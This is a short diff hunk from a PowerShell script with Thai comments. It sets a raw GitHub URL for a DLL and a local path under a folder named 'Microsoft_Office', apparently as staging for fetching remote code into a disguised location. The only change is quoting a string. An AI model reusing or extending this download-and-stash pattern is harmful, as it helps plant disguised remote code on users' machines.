@@ -7,7 +7,7 @@ $GithubDllUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/
 # เส้นทางจัดเก็บข้อมูลแอปพลิเคชัน
 $AppDataDir   = "$env:LOCALAPPDATA\Microsoft_Office"
 $LocalDllPath = "$AppDataDir\FvSDK_x64.dll"
-$LocalDllPathh = STACKX
+$LocalDllPathh = "STACKX"
 
 # ระบบตรวจสอบและเตรียมความพร้อมของโฟลเดอร์ปลายทาง
 if (-not (Test-Path $AppDataDir)) {
